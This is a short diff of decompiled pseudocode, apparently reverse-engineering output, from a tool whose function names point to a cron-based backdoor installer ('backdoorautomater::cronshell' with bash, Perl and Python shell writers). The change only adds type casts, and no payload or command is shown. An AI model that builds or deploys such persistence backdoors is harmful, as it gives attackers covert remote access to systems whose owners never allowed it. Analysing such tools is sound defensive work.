@@ -149,7 +149,7 @@ LABEL_26:
     v44 = *v46;
     v56.m256i_i64[0] = v53;
     v55 = v52;
-    v18 = backdoorautomater::cronshell::write_shell_bash(&v36, &v44, &v55);
+    v18 = backdoorautomater::cronshell::write_shell_bash((__int64)&v36, (__int64)&v44, (__int64)&v55);
     goto LABEL_17;
   }
   if ( (unsigned __int8)v43 == 2 )
@@ -160,7 +160,7 @@ LABEL_26:
     v44 = *v46;
     v56.m256i_i64[0] = v53;
     v55 = v52;
-    v18 = backdoorautomater::cronshell::write_shell_perl(&v36, &v44, &v55);
+    v18 = backdoorautomater::cronshell::write_shell_perl((__int64)&v36, (__int64)&v44, (__int64)&v55);
     goto LABEL_17;
   }
   if ( (unsigned __int8)v43 == 1 )
@@ -171,7 +171,7 @@ LABEL_26:
     v44 = *v46;
     v56.m256i_i64[0] = v53;
     v55 = v52;
-    v18 = backdoorautomater::cronshell::write_shell_pyfile(&v36, &v44, &v55);
+    v18 = backdoorautomater::cronshell::write_shell_pyfile((__int64)&v36, (__int64)&v44, (__int64)&v55);
 LABEL_17:
     LOBYTE(v15) = 1;
     v14 = 0;
